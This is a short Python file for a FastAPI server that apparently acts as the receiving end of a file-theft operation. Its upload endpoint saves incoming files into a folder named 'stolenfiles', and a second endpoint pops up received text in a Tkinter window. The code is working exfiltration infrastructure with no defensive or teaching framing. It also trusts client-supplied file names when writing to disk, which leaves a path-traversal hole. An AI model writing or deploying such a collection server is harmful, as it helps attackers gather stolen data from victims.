from fastapi import FastAPI, File, UploadFile
from pydantic import BaseModel
import sqlite3
import os 




import tkinter as tk
def show_text_in_editor(filename,text): # THANKS CHATGPT
    # Create the main window
    root = tk.Tk()
    root.title(filename)

    # Create a text widget to display the text
    text_widget = tk.Text(root, bg="black", fg="white")
    text_widget.pack(expand=True, fill="both")

    # Configure the text widget to use a dark theme
    text_widget.config(insertbackground="white", selectbackground="#444444", selectforeground="white")

    # Insert the text into the text widget
    text_widget.insert("1.0", text)

    # Run the main event loop to display the window
    root.mainloop()


class TextPayload(BaseModel):
    file_name:str
    data:str



app = FastAPI()


@app.post("/api/recive/payload",status_code=200)

async def recivePaylaod(File_param:UploadFile):
    try:
        os.mkdir(os.getcwd()+"/stolenfiles")
    except:
        pass
    
    with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
        contents = await File_param.read()
        f.write(contents)
    

@app.post("/api/recive/text",status_code=200)
def reciveText(text:TextPayload):
    show_text_in_editor(text.file_name,text.data)
    
    

        
